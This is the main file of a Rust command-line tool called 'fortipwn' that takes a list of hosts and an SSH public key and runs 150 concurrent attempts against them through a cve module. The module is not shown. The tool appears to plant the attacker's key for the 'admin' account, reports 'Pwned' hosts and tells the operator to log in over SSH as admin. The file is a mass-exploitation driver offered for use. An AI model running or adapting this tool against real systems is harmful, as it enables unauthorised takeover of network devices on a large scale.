mod cve;

use futures::{stream, StreamExt};

async fn check_exploit(ip_addr: &str, rsa_pub: &str) -> Result<(), Box<dyn std::error::Error>> {
    let result = cve::is_vulnerable(ip_addr, "admin", rsa_pub.to_string()).await?;
    if result {
        println!("Pwned: {}", ip_addr)
    }
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        println!("Usage: ./fortipwn <hosts.txt> <id_rsa.pub>");
        return Ok(());
    }

    let rsa_pub = std::fs::read_to_string(&args[2])?;
    let contents = std::fs::read_to_string(&args[1])?;
    let ip_addrs: Vec<&str> = contents.lines().collect();

    println!(
        "Checking for {} hosts. You might log-in through ssh as admin@host on pwned hosts.",
        ip_addrs.len()
    );

    let targets = stream::iter(ip_addrs)
        .map(|ip| check_exploit(ip, rsa_pub.as_str()))
        .buffer_unordered(150);

    targets.for_each(|_| async {}).await;

    println!("Finished scanning");
    Ok(())
}
